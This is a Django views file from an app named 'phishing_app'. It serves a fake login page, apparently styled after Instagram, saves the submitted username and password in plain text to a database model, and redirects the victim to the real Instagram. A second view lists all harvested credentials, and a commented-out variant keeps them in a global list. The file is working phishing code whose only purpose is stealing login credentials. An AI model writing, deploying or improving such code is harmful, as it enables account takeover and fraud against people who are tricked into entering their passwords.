from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import CapturedData 

# Store credentials locally
captured_credentials = []

# def login_page(request):
#     global captured_credentials

#     if request.method == "POST":
#         username = request.POST.get("username")
#         password = request.POST.get("password")
#         captured_credentials.append({"username": username, "password": password})
        
#         # Redirect to Instagram after form submission
#         return redirect("https://www.instagram.com/")

#     return render(request, "phishing_app/login.html")

def login_page(request):
    if request.method == "POST":
        username = request.POST.get('username')  # Ensure these match your form field names
        password = request.POST.get('password')

        if username and password:  # Ensure both fields have values
            CapturedData.objects.create(username=username, password=password)

        return redirect('https://instagram.com/')  # Redirect to captured data page

    return render(request, 'phishing_app/login.html')  # Your login page template


 # Import the model

def view_captured_data(request):
    captured_entries = CapturedData.objects.all()  # Fetch all captured data
    return render(request, 'phishing_app/captured_data.html', {'captured_entries': captured_entries})

